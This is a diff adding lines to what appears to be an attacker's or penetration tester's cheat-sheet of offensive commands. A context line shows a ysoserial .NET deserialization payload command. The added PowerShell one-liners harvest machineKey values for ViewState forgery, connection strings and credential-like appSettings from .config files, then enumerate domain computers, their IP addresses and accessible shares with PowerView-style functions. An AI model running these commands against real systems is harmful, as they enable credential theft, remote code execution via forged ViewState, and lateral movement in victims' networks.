@@ -46,3 +46,15 @@ ysoserial.exe -o base64 -g ObjectDataProvider -f JavaScriptSerializer -s -c "pow
 #DebuggableAttribute.DebuggingModes.DisableOptimizations |
 #DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints |
 #DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
+
+# machine keys for viewstate
+gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("/configuration/system.web/machineKey")}
+
+# connection strings
+gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("/configuration/connectionStrings/add")} # ) | select name, connectionString;}
+gci -file -filter *.config|%{([xml](gc $_.fullname)).selectnodes("configuration/appSettings/add")} # ($_.key -like "*cred*" -or $_.key -like "*user*" -or $_.key -like "*pass*")
+
+# enum from box
+$boxes=get-netcomputer -domain xxxxxxxxx -fulldata;
+$boxes|%{$_|add-member -membertype noteproperty -name ipaddress -value (get-ipaddress $_.dnshostname).ipaddress -force};
+$boxes|%{$_|add-member -membertype noteproperty -name shares -value (invoke-sharefinder -computername $_.dnshostname -excludestandard -checkshareaccess) -force};
